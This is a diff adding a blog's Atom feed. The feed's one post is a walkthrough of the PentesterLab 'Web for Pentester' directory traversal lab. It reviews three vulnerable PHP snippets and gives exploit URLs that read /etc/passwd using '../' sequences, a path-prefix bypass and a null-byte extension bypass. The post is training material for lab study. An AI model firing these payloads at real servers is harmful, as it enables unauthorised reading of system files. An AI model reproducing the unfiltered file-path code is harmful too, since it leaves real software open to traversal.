@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: directory traversal | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/directory-traversal/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - Directory Traversal]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal/"/>
+    <updated>2016-03-11T15:13:32-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal</id>
+    <content type="html"><![CDATA[<p>Web for Pentester directory traversal:
+    This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>Tool: Burp Suite
+      Firebug</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example1.php">&lt;?php 
+
+$UploadDir = '/var/www/files/'; 
+
+if (!(isset($_GET['file'])))
+    die();
+
+
+$file = $_GET['file'];
+
+$path = $UploadDir . $file;
+
+if (!is_file($path))
+    die();
+...
+</code></pre>
+
+<p>The developer does not filter <code>$file = $_GET['file'];</code>, so that I can just use <code>file=../../../../../../../../etc/passwd</code> to get <code>etc/passwd</code></p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example1.php?file=../../../../../../../../etc/passwd</code></p>
+
+<p>Burp exploit:</p>
+
+<p><a href="https://vimeo.com/159110994" title="Click to Watch"><img src="http://i.imgur.com/7YTMFQp.png" alt="burp dir trav" /></a></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example2.php">
+&lt;?php 
+
+
+if (!(isset($_GET['file'])))
+    die();
+
+
+$file = $_GET['file'];
+
+if (!(strstr($file,"/var/www/files/")))
+    die();
+
+if (!is_file($file))
+    die();
+    ...
+</code></pre>
+
+<p>The developer tried to filer file by using <code>/var/www/files/</code>, so if I just use <code>file=etc/passwd</code> wont&rsquo;t work. However I can use <code>file=/var/wwww/files/../../../../../etc/passwd</code> to get passwd file.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example3.php">if (!(isset($_GET['file'])))
+    die();
+
+
+$file = $_GET['file'];
+
+$path = $UploadDir . $file.".png";
+// Simulate null-byte issue that used to be in filesystem related functions in PHP
+$path = preg_replace('/\x00.*/',"",$path);
+
+if (!is_file($path))
+    die();
+    ...
+</code></pre>
+
+<p>The developer tried to filter the file var. However, I can still use Null character to bypass it.
+The web application will check the path extension and verify that it is a .png file, bypassing the filter. When this path is passed to the filesystem, the null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem, it interprets the directory traversal vulns and transforms ‘/var/www/images/../../../etc/passwd%00new.png’ into ‘/etc/passwd’.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example3.php?file=../../../../etc/passwd%00.png</code></p>
+
+<h4>reference</h4>
+
+<p><a href="https://www.fishnetsecurity.com/6labs/blog/common-web-application-vulnerabilities-part-6">Directory Traversal</a></p>
+]]></content>
+  </entry>
+  
+</feed>
